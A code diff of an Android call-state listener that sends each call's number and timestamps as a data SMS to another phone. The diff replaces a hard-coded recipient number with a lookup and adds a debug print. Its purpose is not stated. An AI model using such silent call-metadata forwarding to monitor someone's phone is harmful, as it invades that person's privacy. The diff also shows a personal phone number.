@@ -15,8 +15,6 @@ public class IncomingCallStateListener extends PhoneStateListener {
     private static String lastNumber;
     private static boolean inprogress;
 
-    public static final String OUTGOING_NUMBER = "+32475498297";
-
     BroadcastReceiver outGoingCallListner = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
@@ -25,7 +23,8 @@ public class IncomingCallStateListener extends PhoneStateListener {
                     "{\"state\": \"new\", \"number\": \"%s\", \"time\": \"%s\" }",
                     lastNumber, String.valueOf(lastTime)
             );
-            Helpers.sendDataSms(OUTGOING_NUMBER, "9851", body);
+            System.out.println(Helpers.getNumber());
+            Helpers.sendDataSms(Helpers.getNumber(), "9851", body);
         }
     };
 
@@ -39,7 +38,7 @@ public class IncomingCallStateListener extends PhoneStateListener {
                             "{\"state\": \"old\", \"time\": \"%s\", \"dcTime\": \"%s\" }",
                             String.valueOf(lastTime), String.valueOf(System.currentTimeMillis())
                     );
-                    Helpers.sendDataSms(OUTGOING_NUMBER, "9851", body);
+                    Helpers.sendDataSms(Helpers.getNumber(), "9851", body);
                     inprogress = false;
                 }
 
@@ -52,7 +51,7 @@ public class IncomingCallStateListener extends PhoneStateListener {
                         "{\"state\": \"new\", \"number\": \"%s\", \"time\": \"%s\" }",
                         lastNumber, String.valueOf(lastTime)
                 );
-                Helpers.sendDataSms(OUTGOING_NUMBER, "9851", body);
+                Helpers.sendDataSms(Helpers.getNumber() , "9851", body);
                 break;
         }
     }
